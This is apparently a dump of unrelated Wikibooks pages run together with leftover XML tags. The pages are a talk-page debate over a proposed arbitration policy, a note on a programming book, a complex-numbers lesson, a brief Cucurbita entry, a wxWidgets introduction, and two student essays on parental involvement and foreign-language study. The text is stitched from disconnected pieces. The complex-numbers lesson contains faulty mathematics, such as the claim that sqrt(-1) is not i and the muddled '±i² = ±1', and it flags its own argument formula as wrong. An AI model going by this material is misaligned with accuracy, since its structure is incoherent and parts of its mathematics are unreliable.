:The editorial board (as the proposal currently stands) won't deal with disputes whatsoever, because content disputes should be handled by [[Wikibooks:Decision making]], or [[WB:RFC]]. The editorial board will deal with content, distribution, and publishing of books. I've spelled out precisely what the editorial board will do [[Wikibooks:Editorial_board#Purpose|HERE]]. 
:I agree that if we are talking about arbitration that it should be all or nothing. Once an arbitration decision has been made, it should not be open to appeal or overturning. On wikipedia, Jimbo held a veto over the arbitration committee, but he has famously never used that power. This leads me to believe that it's not a common occurrence and we would do just as well to completely forbid it. My point has always been that if arbitration is not the &quot;final word&quot; in a dispute, that there was no point to have it at all. We should also make it clear that arbitration is a final resourt, and the arbitration committee should be very encouraged to turn down cases that haven't exhaused all other solutions.
:By the way, thanks for acknowledging my input on this, sometimes it feels like nobody reads the crap I write around here. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 01:56, 16 March 2007 (UTC)

::Ultimately the WMF board of trustees would hold a very similar authority Jimbo had, but like you mentioned here, it is very, very unlikely that they would ever get involved with a dispute unless the arbiters got so out of hand that basic pillars were being violated and encouraged to be violated by the arbiters.  Using the example (that I am familiar with) of the U.S. Supreme Court, they only hear about 30 cases a year (+/- 20).  You can send up an appeal, but it is very unlikely they will accept all but the most preceedent setting cases.  I think in regards to the WMF board, they might only review about 5-10 arbitrations at all for all Wikimedia projects, all things considered.  Nor should they ever have to get to that level for most situation like that.  Too bad that the WMF hasn't made any formal policy on that point, but it doesn't really matter anyway.
::I would like to see something done that would involve stewards, but again, this is not something to even be covered by this policy.  That would be something that would be decided by the WMF as a multi-project arbitration review group.  And again, they would only be investigating those arbitration matters that seemed to have gone amok.  If such a group is formed, the &quot;community concensus&quot; would more than likely take place on Meta for policies and involve people from nearly all major Wikimedia projects.  They would also only &quot;hear&quot; a very limited number of arbitration cases and still largely defer to decisions made by the individual projects.  So as a pratical matter, this ought to be considered the final resolution to the matter, and certainly action could be taken even if the process is &quot;in appeal&quot;.  --[[User:Robert Horning|Rob Horning]] 03:56, 16 March 2007 (UTC)

== Unnecessary and unhelpful ==

This policy in unnecessary and unhelpful. We've only had a single incident where such a policy was needed. If we're lucky, there won't be another for a few years, at which point committee members may well have moved on. Furthermore, without more experience, we should not be too hasty to create a policy on it just in case it ever happens again. Maybe an essay will be more fitting.

Finally, we shouldn't make it too easy to fall back on this. I see no reason why we shouldn't leave a lot of pressure on editors to make nice. Arbitration should be an absolute exception. Creating any sort of process where people can sign up is just asking for trouble. OK, no-one is proposing a sign-up sheet, but you get the idea.

I've [http://en.wikibooks.org/w/index.php?title=Wikibooks:Arbitration&amp;diff=1377935&amp;oldid=763168 trimmed down] [[Wikibooks:Arbitration]] and think it's OK to keep it around. Most of the content that I cut was something that everyone can agree with and come up with on their own. If we are to pick arbiters, we should pick intelligent people who don't need guides like these, but are able to take matters into their own hands and steer the community through the troubles.

Intelligence is not one of the hall-marks of committees. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 11:42, 13 January 2009 (UTC)

== Reject this proposal? ==
I think this policy is simply unnecessary (see also Swift's comment above.) The current Wikibooks community is very small: Not counting users who only work on their books and aren't really involved with the community, we have: Adrignola (of course), Mike.lifeguard, Jomegat, Thenub, Chazz, Pi zero, Darklama, Duplode, Panic, 33rogers, QuiteUnusual, Swift, and... ok, the list may be incomplete so feel free to add yourself here if I missed you, but anyway it isn't a particularly large community. The reason why there is an ArbCom on Wikipedia is because it has a really large community, and lots of sub-communities under that, which results in a huge number of disputes. Wikibooks? Most books are either abandonned or maintained by only one user (Thenub, for example, is probably the only significant maintainer of Maths), which makes serious disputes very rare. And when there is one, the entire community listed above can participate in it, as there are approximately as many people in the Wikbooks community than there are checkusers in WP! Therefore this proposal is unnecessary and should be rejected.

:Without getting at all into the merits or demerits of the proposal, I'd like to point out that, so it seems to me, what you're naming isn't the Wikibooks community.  It's what one might call the ''project-wide cell'' of the Wikibooks community (or, perhaps, of the Wikibooks ''population'', which doesn't imply the overall coherence of a community): the people who concern themselves with issues that span the entire project.  I don't nearly know my way around the ways of ferreting out statistics on such things, but my impression has been that a book, or sometimes a small and well-defined group of books, tends to be sufficiently large, and at the same time sufficiently focused, that it will contain the attention of its contributor(s), supposing that it has any, and they will form a sort of cell.  So I imagine the population of Wikibooks as a largely partitioned thing, made up of these cells.  With some overlap here and there, of course.  There are just a few of us who are involved on a regular basis in the project-wide stuff, with some of those also associating with one or more particular books.  Actually ferreting out these statistics, to see how well my theory holds up, would be interesting (also, one fears, time-consuming); but here's one I do happen to know about:  [[Special:ActiveUsers]] shows, as of just now, 619 registered users who have edited Wikibooks in the past month.  Contrasted with, um, 370 registered users who have edited Wikinews in the past month.  Oh, and another with some degree of relevance &amp;mdash; the [{{fullurl:Special:ListUsers|group=editor}} list of editors], which if I counted right has 184 names.  Wikibooks has rather less project-wide participation per capita than does Wikinews (which consequently tends to feel like a bigger place than Wikibooks), but it's not really ''that'' small.  --[[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 13:53, 7 June 2010 (UTC)

::The Wikibooks-Wikinews comparison is an approximately 1:1.8 ratio, with reference to the number of users that actually made a significant number of edits. However, as a newbie wikinewsie, I feel that the rules of Wikinews are very strict - of the 6 published articles I wrote none of them passed the first review - and besides, Wikinews has to race against the clock, while Wikibooks doesn't. So, on Wikibooks, users can sit down, have a cup of coffee, and discuss calmly. This is not possible in Wikinews as things have to be real fast, at least IMO, as news becomes olds very soon.

:::(Heh.  You've got the measure of Wikinews.  They're in a hurry.  Plainspoken because they don't have time for courtesies, and they simply don't ''do'' long thoughtful discussions because they don't have time for that, either (though they sometimes have short thoughtful discussions).

:Reject too. The nature of Wikibooks (specially the partitioned character Pi zero mentioned) means that large-scale conflicts are extremely rare, so we do not need this level of bureaucracy.

:I think once again Kayau, has put forward an unnecessary proposal. I don't see any positive outcome for promoting the rejection of a proposal. The status of a rejected proposal will remain mostly the same. There are a lot of proposal that haven't as yet reached a stage that the proponents felt as good enough to put them forward for approval, it doesn't seem as useful for someone that hasn't an invested interest in them to shortcut the process in this way especially since Kayau didn't first express his opposing position in a more positive and constructive meaner or contributed to fix the proposal.
:Even if no positive outcome is expected there is a gain of visibility due to the process. I fully agree with Pi zero, in past discussions we have refereed to this active groups as the active majority (and subsets as active minority), since some processes of decision in the past have been decided by a majority vote and at times this active majority dangerously sees itself as the full community.
:This proposal was needed at a time that consensus was not always seeked and is still somewhat pertinent for example in cases like the [[User:Thekohser]] (see the talk page), personally I think that blocking the user from writing on his talk-page was uncalled for and refuses him the ability to pursue an unblock, note that the previous unblock request was not initiated by the user.

:I could see leaving it as a draft proposal or rejecting it, with the former simply leaving it open for if the community ever grows large enough to need it.  There are plenty of draft proposals that have been in limbo for some time.

::I don't think it is particularly healthy to have obviously inactive drafts hanging around forever in limbo, and feel that stating clearly why the current community is not interested in them is productive. As for practical matters, maybe all we need is a softer version of {{tl|rejected}}, stating something like &quot;This proposal was declared inactive by community consensus in June 2010. It is kept for future reference, should the issues it addresses need to be reconsidered.&quot; --[[User:Duplode|Duplode]] ([[User talk:Duplode|talk]]) 23:49, 7 June 2010 (UTC)

:::There are two points of contradiction on that view. The proponents never advanced the proposal for adoption, in this respect Kayau broke common practice by proposing the rejection of a non-proposal (this was and still is a project for a proposal) and as a non proponent (not working to improve and adopt it) placing him clearly as a non supporter, this action should then be considered void.
:::The other point is the value of a state of rejection. That state is only reached as proposal are presented for adoption (not for rejection), and the only outcome that can be gathered from it is that at that particular time the community felt that the proposed text had no merit and wouldn't benefit the project as it was presented, in a small time-frame this would signify that a readdressing of the proposal would only be valid after significant changes and in a log run when due to changes in general attitude, the proponents see that the time is right for a possible adoption (similar to the last aborted RfD by Kayau). This doesn't invalidate targeting the staled proposal for RfD, but that goes in accordance to the deletion policy, since this types of texts aren't text books, special considerations are required to determine what would indeed merit a RfD in these cases, this can easily be done by asking the proponents if they feel the proposal project (rejected or not) is still useful. I doubt that you will find a proposal orphan of proponents (but all will assuredly  have objectors). Consider also the next lines.
:::Policy and guidelines proposals have another significance (not all non-textbook content on Wikibooks has an equal state). They reflect the views of minorities until adopted, as such they merit some extra protection. Most significant changes and improvements to the Wikibooks project will spawn from those texts in a more consensual way. It is good to have such concepts available to build consensus and test opinions and it also reduces the need to rehash issues from 0.  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 00:38, 8 June 2010 (UTC)
::::I am afraid I must insist that the proposal should be rejected. Again I shall warn about my lack of age and English skills, as well as my being still rather new to Wikibooks. In my opinion, the word 'draft' implies that the proposal shall be either rejected or approved in the near future. (This is certainly the case in Wikipedia.) If a proposal with little chance of going through is put into the 'draft' category, then eventually the 'draft' category will be filled up, and it is hard to distinguish between those who are generally not accepted at the time, and those who have a potential of being adopted soon. This causes confusion. Another thing is that just because a proposal is rejected does NOT mean that it cannot be reopened for discussion again. As long as a Wikibookian thinks it is time that the proposal be reconsidered, then I see no reason why the community cannot discuss again and adopt it. You also mentioned the RfD for colouring book. I admit that I was wrong about that. You also mentioned that they 'reflect the views of minorities until adopted, as such they merit some extra protection.' That sounds rather like an essay. [[:w:Wikipedia:Quotations]], for example, was an essay at the beginning, but it was nominated as a policy. If a remember correctly it was rejected.
:::: This draft proposes that a new committee be started in Wikibooks. That makes is different from other proposals (eg. style guides etc.) However, if the new committee is not even likely to be formed, why would one want a set of rules to be proposed for it? If this proposal is not marked as a 'proposal', it may as well become a ''essay'', though it has to be made clearer that only some users want this to happen, and state clearly a point.
::::Finally, a question: (though my comment may be considered having the head of a tiger and the tail of a snake to use a Chinese phrase) Panic, you have stated several reasons against my proposal that this draft should be rejected. However, what is your standpoint? Do you think that this policy should be adopted? This should be addressed as well, IMO.

:::::My position is that the draft is not ready to be proposed (as can be seen in by earlier discussions, there is no consensus). I see the creation of an arbitration process extremely important (even if I'm not convinced of a need for a standing committee) I would prefer an open and ad-hoc process with the agreement of the participants on the dispute. But I recognize that having a pool of Wikibookians available to help other reach agreements can be important, since most people will probably shy away from any antagonistic contest (be pushed over or abandon the project if consensus fails) or be forced/lead to escalate the issue.
:::::I also agree with the comments made recently, that at present there is no need for the process, except for the example I gave above (that I disagree on how it took place, and the final result but I think it was up to that Wikibookian to protest). Things have evolved on Wikibooks in spirit and rules (the block policy), people have also changed and hopefully learned from past mistakes, but in time it may become again a necessity to deal with issues that split the active majority in a way that consensus has to be reached by the arbitration solution.  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 10:41, 8 June 2010 (UTC)

**This book currently contains mostly C code, but the stated scope of this book is to include C++ and VB code as well. I have added most of the content so far, and I dont have much expertise in C++ or VB, so I havent been able to add it. I do think, however, that the C++ book should contain general aspects about the language, and shouldnt have to cover all sorts of proprietary information such as the Windows-specific things. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 22:40, 17 December 2006 (UTC)</text>

      <text xml:space="preserve">This topic introduces the [[w:Complex number|complex number system]] from both an algebraic and a geometric point of view. The underlying idea is the introduction of a number &lt;math&gt;i\,&lt;/math&gt; such that &lt;math&gt;i\,&lt;/math&gt; and &lt;math&gt;-i\,&lt;/math&gt; are the two solutions of the quadratic,
:&lt;math&gt;x^2 + 1 = 0\,&lt;/math&gt;
Multiples of &lt;math&gt;i\,&lt;/math&gt; are called '''pure imaginary numbers''', and numbers which can be expressed as &lt;math&gt;a + bi\,&lt;/math&gt; (where &lt;math&gt;a\,&lt;/math&gt; and &lt;math&gt;b\,&lt;/math&gt; are [[w:Real number|real number]]s) are called '''complex numbers.''' (This means that all real numbers are also complex numbers.) 
Algebraic manipulation of complex numbers follows all the standard algebraic rules, with the further rule that
:&lt;math&gt;i^2 = -1\,&lt;/math&gt;
which allows algebraic simplifications.
== Anatomy of a complex number ==
[[Image:Argand plane.png|thumb|388px|Diagram of a point on the argand (complex) plane, showing the polar and cartesian forms]]
=== Real and Imaginary parts ===
All complex numbers can be written in the form &lt;math&gt;a+ib&lt;/math&gt; where &lt;math&gt;a&lt;/math&gt; and &lt;math&gt;b&lt;/math&gt; are real numbers. In this form, the ''real'' part is &lt;math&gt;a&lt;/math&gt; and the ''imaginary'' part is &lt;math&gt;b&lt;/math&gt;. The real part of a complex number &lt;math&gt;z&lt;/math&gt; is usually denoted &lt;math&gt;\mbox{Re}(z)&lt;/math&gt;, and the imaginary part &lt;math&gt;\mbox{Im}(z)&lt;/math&gt;.

=== Geometrical representation of complex numbers as a vector (Modulus-argument form) ===
It is sometimes useful to represent a complex number as a vector. If &lt;math&gt;z = x+iy\,&lt;/math&gt;, one can plot a point on the number plane at &lt;math&gt;(x,y)\,&lt;/math&gt;. The vector from the origin to the point &lt;math&gt;(x,y)\,&lt;/math&gt; can also be described in terms of the ''magnitude'', or '''modulus''' (i.e., the distance from the origin to the point) &amp;mdash; denoted &lt;math&gt;|z|\,&lt;/math&gt; &amp;mdash; and the ''angle'' or '''argument''' (i.e., the angle the line through the origin and the point makes with the &lt;math&gt;x&lt;/math&gt;-axis) &amp;mdash; denoted &lt;math&gt;\arg z&lt;/math&gt;. The modulus is usually called &lt;math&gt;r&lt;/math&gt;, and the argument &lt;math&gt;\theta&lt;/math&gt;. The complex number &lt;math&gt;z = x+iy\,&lt;/math&gt; can then be expressed in the form &lt;math&gt;z = r(\cos\theta+i\sin\theta)\,&lt;/math&gt;, where &lt;math&gt;r = \sqrt{x^2+y^2}&lt;/math&gt; and &lt;math&gt;\theta = \tan^{-1}\frac{y}{x}&lt;/math&gt; (WRONG: see discussion). This is known as '''modulus-argument form''' and is often abbreviated to &lt;math&gt;z = r\mbox{cis}\theta\,&lt;/math&gt;.

== Algebra on complex numbers ==
This topic requires you to frequently deal algebraically with complex numbers. In order to do this, you must be familiar with the following (which you can read about on [[w:Complex number|Wikipedia's complex number page]]):
*Definition of equality of complex numbers, and equating co-efficients
*Addition, subtraction, and multiplication of complex numbers
*The [[w:Complex conjugate|conjugate]] of a complex number, including its algebraic simplifications. You should try to prove some of these properties, by using the forms &lt;math&gt;z=x+iy\,&lt;/math&gt; and &lt;math&gt;\overline{z}=x-iy&lt;/math&gt;
*Dealing with complex fractions algebraically

==== Negative square roots in the quadratic formula ====
Complex numbers allow us to use the quadratic formula to solve all quadratics, even where the square root is negative. Consider the following quadratic equation, which has no real solutions:
:&lt;math&gt;x^2 + x + 1 = 0\,&lt;/math&gt;
Using the quadratic formula:
:&lt;math&gt;\begin{align}
   x &amp; = \frac{-b \pm \sqrt{b^2 - 4ac} } {2a} \\
     &amp; = \frac{-1 \pm \sqrt{-3} } {2}
\end{align}&lt;/math&gt;
We deal with the negative square root as follows:
:&lt;math&gt;\begin{align}
    \sqrt{-3} &amp; = \sqrt{3 \times (-1)} \\
              &amp; = \sqrt{3} \times \sqrt{-1}
\end{align}&lt;/math&gt;
However, note that
:&lt;math&gt;\sqrt{-1} \neq i\,&lt;/math&gt;
but rather
:&lt;math&gt;\sqrt{-1} = \pm i\,&lt;/math&gt;
so we continue with the quadratic formula:
:&lt;math&gt;\begin{align}
   x &amp; = \frac{-1 \pm \sqrt{-3} } {2} \\
     &amp; = \frac{-1 \pm (\sqrt{3} \times \sqrt{-1})} {2} \\
     &amp; = \frac{-1 \pm (\sqrt{3} \times (\pm i))} {2} \\
     &amp; = \frac{-1 \pm \sqrt{3}i} {2} \\
     &amp; = \frac{-1}{2} \pm \frac{\sqrt{3}}{2}i
\end{align}&lt;/math&gt;
The last form is preferred, because it completely separates the real and imaginary parts in the equation. Note that normally, the detail shown here is not required; you are expected to skip from the first to the fourth line in the above working.
===== &lt;math&gt;\sqrt{-1}\,&lt;/math&gt; is not unique =====
Although pointing out
:&lt;math&gt;\sqrt{-1} \neq i\,&lt;/math&gt;
may seem pedantic, it is an important thing to realise and be aware of. In the real number system, &lt;math&gt;x=\sqrt{a}&lt;/math&gt; is defined to be the '''positive''' solution (for &lt;math&gt;x&lt;/math&gt;) to
:&lt;math&gt;x^2 - a = 0\,&lt;/math&gt;
in the complex number system, there is no useful sense of positive-ness or negative-ness, so the square root cannot be uniquely defined. For all intents and purposes, &lt;math&gt;i\,&lt;/math&gt; could be defined to be 'the other' root of &lt;math&gt;x^2 + 1 = 0&lt;/math&gt;, and dealing with complex numbers wouldn't change.

For a solid example of why it is wrong to outright say &lt;math&gt;\sqrt{-1}=i\,&lt;/math&gt;, consider:
:&lt;math&gt;1=\sqrt{1}=\sqrt{(-1) \times (-1)}=\sqrt{-1} \times \sqrt{-1} = i^2 = -1&lt;/math&gt;
The mistake lies in
*mixing the real number (unique) definition of &lt;math&gt;\sqrt{x}&lt;/math&gt; with the complex number (non-unique) definition
*assuming &lt;math&gt;\sqrt{-1}=i\,&lt;/math&gt;. If we didn't assume this, then we could write
:&lt;math&gt;\sqrt{-1} \times \sqrt{-1} = (\pm i) \times (\pm i) = \pm i^2 = \pm 1\,&lt;/math&gt;
:which at least ''contains'' the right answer.

==== Complex square roots ====
You should be able to solve equations like
:&lt;math&gt;z^2 = 1+i\,&lt;/math&gt;
To do this, we first let
:&lt;math&gt;z=a + ib\,&lt;/math&gt;
and then
:&lt;math&gt;\begin{align}
(a+ib)^2          &amp; = 1 + i \\
a^2 + 2aib + (ib)^2 &amp; = 1 + i \\
a^2 + 2aib + i^2b^2 &amp; = 1 + i \\
a^2 + 2abi - b^2   &amp; = 1 + i \\
\end{align}&lt;/math&gt;

In order for two complex numbers to be equal, their complex part ''and'' their real part must be equal. Therefore, we can equate the ''coefficients'' of i (the complex coefficients) and the real numbers separately. From this, we can solve for a and b:

'''Real Part''': &lt;math&gt; a^2 - b^2 = 1 &lt;/math&gt;

'''Imaginary Part''': &lt;math&gt; 2ab = 1 &lt;/math&gt;

Soving:
:&lt;math&gt;\begin{align}
    b &amp; = \frac{1}{2a} \\
    a^2 - \left ( \frac{1}{2a} \right)^2 &amp; = 1\\
    a^4 - a^2 - \frac{1}{4} &amp; = 0 \\
    \left( a^2 \right)^2 - \left(a^2\right) - \frac{1}{4} &amp; = 0 \\
    a^2 &amp; = \frac{1 \pm \sqrt{2}}{2} \\
\end{align}&lt;/math&gt;
But &lt;math&gt;a&lt;/math&gt; is real, so &lt;math&gt;a^2&lt;/math&gt; is positive.
:&lt;math&gt;\begin{align}
    a^2 &amp; = \frac{1 + \sqrt{2}}{2} \\
    a   &amp; = \pm \sqrt{\frac{1+\sqrt{2}}{2}} \\
    b &amp;= \frac{1}{2a} = \pm \sqrt{\frac{1}{2 + 2\sqrt{2}}} \\
    z &amp; = a + ib \\
      &amp; = \pm \left( \sqrt{\frac{1+\sqrt{2}}{2}} + \sqrt{\frac{1}{2 + 2\sqrt{2}}}i \right)
\end{align}&lt;/math&gt;

We have two solutions for &lt;math&gt;z&lt;/math&gt;, which makes sense, since quadratic expressions have two roots. We can verify that &lt;math&gt;z^2 = 1+i&lt;/math&gt; by squaring it (which is left as an exercise for the reader).

'''''Cucurbita''''' is a genus in the gourd family Cucurbitaceae.  It includes species grown for their fruit and edible seeds (the squashes, pumpkins and marrows, and the chilacayote), as well as gourds. Many North and Central American species are visited by specialist bees in the group Eucerini, especially the genera Peponapis and Xenoglossa, and these bees can be very important for fruit set.

==Description==
Vines, sometimes short, with large palmate leaves and tendrils. The flowers are large, orange, and unisexual, with both genders usually occurring on each plant. Fruits are large fleshy berries called pepos.

==Growing conditions==
Full sun, rich, moist, but well-drained soils.

'''Introduction'''

wxWidgets formerly known as wxWindows is a framework for developing cross-platform GUI applications in C++. Julian Smart started the framework in 1992 at the Artificial Intelligence Applications Institute, University of Edinburgh. In 1995, a port to Xt was released by Markus Holzem. In May 1997, the Windows and the GTK+ ports were merged and put into a CVS repository.

'''What is wxWidgets'''

wxWidgets gives you a single, easy-to-use API for writing GUI applications on multiple platforms. Link it with the appropriate library for your platform (Windows/Unix/Mac) and compiler (almost any popular C++ compiler), and your application will adopt the look and feel appropriate to that platform. On top of the great GUI functionality, wxWindows gives you: online help, network programming, streams, clipboard and drag and drop, multithreading, image loading and saving in a variety of popular formats, database support, HTML viewing and printing, and much more.

'''Who should use wxWidgets'''

wxWidgets is a framework very much similar to MFC, except for a few negative points of its own. Those MFC programmers who are aware of the growing number of Linux users and who want to write cross platform GUI applications can use wxWidgets. With wxWidgets, it is very easy to use a framework based on C++ and it has a proven record of 13 years. In fact, wxWidgets is very stable and is supported on:

* Windows 3.1, Windows 95/98, Windows NT, Windows 2000/XP, Windows ME, Windows CE.
* Linux and other UNIX platforms with GTK+.
* UNIX with Motif or the free Motif clone Lesstif.
* Mac OS.
* Embedded platforms are being investigated. See the wxUniversal project.
* An OS/2 port is in progress, and you can also compile wxWidgets for GTK+ or Motif on OS/2.

'''Why use wxWidgets'''

There are a number of options available for writing cross platform GUI development, like: JAVA, Mono.NET, Qt, etc. Java has failed to prove itself as an efficient alternative. Qt is good but commercial and nobody knows its future. Mono.NET seems to be good but is largely driven by Microsoft, it seems like a copy of the work done by Microsoft and it has not yet proved itself as a successful alternative. Also, people would not like to use an extra burden of layer for highly efficient software. As wxWidgets does not use any middle layer and uses only the native controls available on the platform, it gives a nice look and feel to the application.

    * It is very complete. There are many utility classes like : wxRegEx, wxFTP, wxSplashScreen, wxZipInputStream, etc.
    * It is still heavily developed, and has a lot of support from the open source community.
    * Many compilers and platforms are supported : Windows, Linux, Mac, Unix.
    * There's a lot of documentation available on the internet, forums, wxBook.
    * It's free for personal and commercial use, and is more flexible than the LGPL license.
    * Whenever possible, wxWindows uses the platform SDK. This means that a program compiled on Windows will have the look and feel of a Windows program, and when compiled on a Linux machine, it will have the look and feel of a Linux program.
    * Ease of learning, it has the same Event tables and similar API and classes like that of WINAPI and MFC.
    * A lot of sample is provided in the samples directory of the installation, which contains how to use the basic controls, multi threading, MDI, drag and drop, sockets, printing and lots more.
    * A lot of ready to use classes are available, like: wxGenericDirCtrl, wxCalendarCtrl, wxDatePickerCtrl, wxTipWindow, wxStyledTextCtrl, wxStaticPicture, wxLEDNumberCtrl, wxEditableListBox, wxFoldPanelBar, wxGIFAnimationCtrl, wxSplashScreen, OGL (Object Graphics Library), FL (Frame Layout), etc. This is one of the main repository.
    * A lot of add on libraries are available to make the programming task easier:
          o wxMozilla.
          o wxIndustrialControls.
          o wxCURL.
          o ToasterBox.
          o wxVTK.
          o wxDockIt.
          o wxIFM.
          o wxMathPlot.
          o wxTreeMultiCtrl.
          o wxAUI.
          o wxPropertyGrid.
          o wxSMTP.
          o wxResizeableControl.
          o wxOTL.
          o wxReportWriter.
          o wxHyperlinkCtrl.
          o wxSQLite.
          o wxIE.
          o wxCTB.
          o AWX.
          o wxSpellChecker.
          o wxArt2D.
          o wxImprola.
          o wxHTML.
          o wxStEdit.
          o wxLCDWindow.
          o mmwx.
          o LitWindow.
          o Keybinder.
          o wxBetterDialog.
          o wxBZipStream.
          o wxCrashReport.
          o wxHTTPServer.
          o wxRarInputStream.

      <text xml:space="preserve">'''Parental Involvement and School Achievement'''

==Introduction==
Parental involvement is one of the most essential tools needed in th success of a child.  The earlier a parent involves themselves in the educational process the more effective it wil be.  Getting an early start on reading with a child is the most stimulating experience contribution to a childs achievment[michigan department of education].  When a parent is directly involved in a childs education the child will show progress, a positive attitude, and comfort in the clasroom.  86% of the general public belive the parent is the most important way to improve students and schools[michigan department of education].  So high expectations set in the household by parents is know to carry over into the classroom. A parents should establish a daily routine, moniter activities, value learning and hard work and encourage developement.

==Daily Routine==
When a parent establishes a daily routine all of the responsibilites of the child are understood.  It allows for an open slat for communication between parent and child.  The parent must set the enviornment and supply needed materials for all the responsibilities to be carried out.  Times and quiet places to study, household choures, set bedtimes and preparing balanced meals should be the necesseties for the daily routine set by the parent and child.  The child needs to understand when, how, and by what time all task need to be completed.  This allows the child to excersise organization and discipline at home and these qualities will carry into the classroom.

==Activities==
An involved parents also moniters all activities inside as well as outside of school.  This includes monitering tv time, checking on child while at home, and arranging out of school activities that intrest the child. Some examples include sports,clubs and social events.  It is important for a parent to allow a student to take part in activities outside of school.  Especially if school is not a high point to the child, encouranging them to take part in something that intrest them can be a much needed outlet.  Effective parent are able to keep up with times, places, and events that involve this intrest.  This allows for the child to take part in activities that they enjoy but still apply some sort of responsibility.  An effective parent also finds time for in school activities.  Parent/Teacher conferences and school function such as PTA meeting are a few examples of important in school activities.  Effective parents make it a priorty to involve themselves in these activites[Strenecky and Mcloughlin].  Showing concern and making a parent/teacher relationship shows team work between you and the teachers, this way you have a hand in providing the most effective education for your child.

==Getting Involved==
An effective parent directly engages themselves in the success of their child and this allows for a consistent education.  A child spends 70% of their awaken day outside of the classroom[michigan department of education]therefore when education is reenforced in the home it makes for an increase in their education.  An effective parent believes that a good education is necessary and important to their child.They will express concern in the child , show leadership and model desireed behavior.  The parent will supply encouragement,ambition.and confidence to the child.  Even if a student struggles in some areas of a subject an effective parent will show that with hard work all things are possible. The ideas that the parent expresses to the child about education will hopefully be passed on and become the same to the child.

==Discipline==
Discipline is also a very important part of the effective parent role.  Even though today how to discipline is very contreversial it is definataly important.  Too harsh of a punishment or too slack of one may not be effective in the way the parent desires.  The idea is make the child understand that the decision they made was wrong.  That is the number one way to make disciline effective.  Allowing the child to understand and reconize what they did wrong helps them to reevaluate the situation and see what they should have done differently.  An effective parent allows the student to make mistakes but the will guide them show them alternative options from what they chose.

==Conclusion==
When a parent takes on the responsibility of providing a stable and caring home and gets involved in the school process the better the outcome for the child.  An effective parent is the direct link to the success of there child. The parent will be consistant with this through all grade levels and in all situations.  The home enviornment is where all qualities of the child stem.  Effective parents make it their duty to allow for success in all ares of their childs life.  Home is where the heart is , so providing love, encouragement, and displine provides the child with everything they need to become successful.

      <text xml:space="preserve">== '''Why is foreign language education important 
in American schools?''' ==







== '''''Introduction''''' ==

Foreign languages education is becoming so important today, because society is getting smaller. Whether we like it or not, we are facing a mutual dependence in the cultural, economic, social, technological, and political worlds. The main facet of globalization for the American schools is the growing linguistic, cultural, ethnic, and religious diversity of the students. In order to answer the question “Why is foreign language education important in the American schools?” it is necessary to look at the advantages it gives people, to the nation as a whole, and how it makes better citizens and better persons. 

In 2005, Janice Stewart, an education research analyst, established that the study of a foreign language is associated with three supplementary profits of &quot;increased cognitive skills, higher achievement in other academic areas, and higher standardized test scores.&quot;


== '''''Benefits of learning a foreign language for students''''' ==
 

The first reason to learn another language is its benefits for the persons. Different studies (Bruck, Lambert, and Tucker, 1974; Hakuta, 1986; Weatherford, 1986;  Bamford and Mizokawa, 1991, Hamayan, 1986) show students in foreign language programs exhibiting greater cognitive development, creativity, and divergent thinking. Wilburn Robinson (1992) believed that bilingual children have &quot;a mental flexibility, a superiority in concept formation, and a more diversified set of mental abilities.” When children develop literacy in more than one language, they gain a better comprehension and usage of language. If started early, the benefits are even bigger it has an effect on intellectual and rational development and improves skills in one’s native language. Development of a better ear for listening has been recorded, and students get a lead in language requirements for college (http://www.cal.org/earlylang/benefits/benefits_of_being_bilingual.html)

The bilingual brain develops more densely. Researchers (Armstrong and Rogers (1997))   show that being bilingual structurally changes the brain. Their study shows the effect was strongest in people who had learned a second language before age 5. (Hitti , 2004).Further benefits include an increase in concentration abilities in bilingual adults and researchers found that &quot;bilingualism appears to offset age-related losses&quot; in certain mental processes. 
Studies (for the College Entrance Examination Board &quot;College Bound Seniors: The 1992 Profile of SAT and Achievement Test Takers&quot;) found that students who took a foreign language in high school scored higher on the verbal scale of the SAT, no matter what their socioeconomic backgrounds were and the same observation was made with students with 4 or more years of foreign language learning compared to those with 4 or more years in any other subject area. 
Learning a foreign language allows people to achieve in others areas too. Students exposed to foreign language education &quot;showed statistically significant gains … in math and language after only one semester of study.&quot; These studies illustrate that studying a a foreign language enhances the rational skills of students it boosts abilities in reading, writing, and mathematics. 



Besides being valuable for people, foreign language learning allows positive contribution to society, by staying competitive in the global economy, national security or simply be equal to other nations. 


” I have traveled around the world and witnessed firsthand our competition and it is very clear that we need to maintain high standards. We let our students down if we fail to prepare them to succeed in this global economy.&quot; Governor Christine Gregoire.


== '''''Benefits of learning a foreign language for the nation''''' ==


To stay competitive in an international economy, adjustment and better training of future citizens is needed. Knowing another language allows contact with more people and resources, thanks to wider communicating capacities, and understanding of cultures. It gives people an advantage in the workforce by opening up extra job opportunities (reporters, international business professionals, diplomats, pilots etc). Besides technology, the most important quality to companies’ executives is exposure to others cultures and travels. Minnesota Governor Tim Pawlenty said &quot;We live in a changing world, with changing technology, changing culture, and changing economies.&quot; U.S. citizens need &quot;to better understand language, culture, and foster relationships; and of course a big part of that is having an educational system that is aware of those trends.&quot; 

In a conference sponsored by the Defense Department, David S.C. Chu, a defense undersecretary said that more Americans must be able to speak foreign languages to protect the nation’s interests and because the concept of war has changed. These days the U.S. military must deal “with nuance, illusions and culturally coded speech”, not only with combat issues. Unfortunately, less than one percent of high school students are studying Arabic, Chinese, Japanese, and Korean-languages the American government classifies as critical to national security. (http://www.defendamerica.mil/articles/jun2004/a062204b.html) 

Foreign languages studies are required in numerous countries, and have been part of the curriculum for years. At various levels of our society, people appear to perceive more and more the necessity for foreign language education. Parents are concerned with their children’s future; military leaders, business professionals and even politicians also have a stake in the future. In January 2007, Senator Voinovich said “I am deeply concerned that Americans are lagging behind much of the world in critical foreign languages, cultural awareness, and geographic knowledge. This lag can negatively impact our nation in very real ways, such as losing valuable business opportunities overseas, faulty intelligence from failing to promptly translate critical documents, or of misunderstandings in diplomatic communications.” 

&quot;While only 44 percent of our high school students are studying any foreign language, learning a second or even a third foreign language is compulsory for students in the European Union, China, Thailand, and many other countries.&quot; Secretary of Education Margaret Spellings, January 2006.

